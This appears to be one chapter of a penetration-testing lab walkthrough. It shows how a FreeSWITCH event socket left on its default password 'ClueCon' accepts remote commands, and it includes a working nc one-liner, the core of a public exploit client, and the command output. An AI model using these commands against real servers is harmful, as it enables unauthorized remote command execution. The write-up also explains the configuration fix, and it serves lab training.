# 02 — The event socket

Port 8021 is not a vulnerability by accident. `mod_event_socket` is FreeSWITCH's management
interface, and it is *supposed* to run commands. The vulnerability is that it still accepts the
password that shipped in the default configuration.

| Step | Runs on |
|---|---|
| 2.1 The handshake | Kali |
| 2.2 Authenticate with the default password | Kali |
| 2.3 Run a command | Kali |
| 2.4 What `-ERR no reply` means | Kali |
| 2.5 The exploit wrapper | Kali |

---

## 2.1 The handshake

**On Kali**

```bash
{ printf 'auth ClueCon\n\n'; sleep 2; printf 'api system whoami\n\n'; sleep 2; } | timeout 10 nc 192.168.137.151 8021
```

```
Content-Type: auth/request

Content-Type: command/reply
Reply-Text: +OK accepted

Content-Type: api/response
Content-Length: 11

oscp\chris
```

**Reading it:** four lines of protocol explain the whole box.

- On connect the server volunteers `Content-Type: auth/request` — it wants a password before
  anything else. There is no banner advertising a version, so this tells nmap nothing and a human
  everything.
- `auth ClueCon` → `+OK accepted`. `ClueCon` is the **built-in default password** in
  `conf/autoload_configs/event_socket.conf.xml`. It has not been changed.
- `api system <cmd>` is an ESL *API* command, executed with the privileges of the FreeSWITCH
  service. `system` shells out through `cmd.exe /c` and returns stdout.

The identity that answers is `OSCP\chris` — a normal local user (the host is in `WORKGROUP`, so
this is a machine account, not a domain one). The PBX runs as that unprivileged user rather than as
`LocalSystem`, which is why the shell is only the first half of the box.

## 2.2 Authenticate with the default password

Two properties of the default configuration make this reachable from off-host:

| Setting | Default | Effect here |
|---|---|---|
| `password` | `ClueCon` | known value, unchanged |
| `listen-ip` | `::` (all interfaces) | reaches the network, not just loopback |
| `apply-inbound-acl` | *(commented out)* | no source-IP restriction |

FreeSWITCH's own documentation warns that ESL is a privileged interface and should be ACL-bound and
password-protected. Neither control is in place.

## 2.3 Run a command

Every command in the rest of this walkthrough is sent through one small Python client, which is the
public exploit for this version (`freeswitch-exploit.py`, author 1F98D) trimmed to a single call.
Its whole working part is four steps:

```python
s.send(bytes('auth {}\n\n'.format('ClueCon'), 'utf8'))
s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
response = s.recv(8096).decode()
print(response)
```

Nothing is exploited in the memory-corruption sense. The client authenticates to an administrative
service with its default password and asks it to run a command. That is why the box falls over in
one step and why the fix is a configuration change, not a patch.

## 2.4 What `-ERR no reply` means

The first attempts on this box were spent misreading the protocol, so it is worth writing down.

**On Kali**

```bash
python3 1.py 192.168.137.151 "pwd"
python3 1.py 192.168.137.151 "cd \scripts"
```

```
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```

`-ERR no reply` is **not an error report**. ESL returns it whenever the `api` command produced no
stdout. Three different causes all produce the same four words:

| Command | Why stdout was empty |
|---|---|
| `pwd` | not a `cmd.exe` builtin — `pwd` is a PowerShell alias, so `cmd /c pwd` fails and the error goes to **stderr**, which is not captured |
| `cd \scripts` | succeeds, prints nothing, and the working directory dies with the process |
| `pscore6` | not a command at all — it was a word copied out of the PowerShell banner |

The consequence for the whole engagement: **exit status and stderr are invisible.** A command can
fail completely and look identical to one that succeeded quietly. Every test from here on is
written to produce observable stdout, and every redirect uses `2>&1`.

The positive control is a command that does write to stdout:

**On Kali**

```bash
python3 1.py 192.168.137.151 "powershell"
```

```
Authenticated
Content-Type: api/response
Content-Length: 172

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Program Files\FreeSWITCH>
```

Two useful facts from the prompt: PowerShell is available, and the service working directory is
`C:\Program Files\FreeSWITCH` — the install directory, which is **not writable** by `chris`. Every
staged file therefore has to go to a temp path, and every reference to it must be absolute, because
the working directory does not survive between calls.

## 2.5 The exploit wrapper

`tools/1.py` (in this directory) is that client. Every command block in this walkthrough reads:

```bash
python3 1.py <target> "<command>"
```

with the target `192.168.137.151`. Because the command is sent as a single line terminated by a
blank line, two characters need care:

- **`&` and `|`** are interpreted by the *outer* shell on the FreeSWITCH side, so chaining works but
  splits unpredictably inside nested quotes. Single commands are safer.
- **`%VAR%`** is expanded by the `cmd.exe` that FreeSWITCH spawns *before* any child process runs,
  so `%USERNAME%` reports `chris`, not the identity of a process a privilege-escalation tool later
  creates. This bites in chapter 05.

→ [03 — Foothold](03-foothold.md)
